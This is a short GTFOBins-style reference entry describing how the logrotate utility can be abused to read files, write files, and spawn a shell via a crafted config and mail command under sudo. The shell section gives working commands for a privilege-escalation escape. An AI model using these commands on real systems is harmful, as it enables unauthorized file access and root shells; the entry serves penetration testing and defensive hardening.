---
type: gtfobin
name: logrotate
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# logrotate

## file-read

```bash
logrotate /path/to/input-file
```
_The first word is returned in a error message._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
logrotate -l /path/to/output-file DATA
```
_The content is written in a log file._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh
logrotate -m /path/to/temp-file.sh -f /path/to/temp-file
```
_This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive._
**Contexts:** sudo
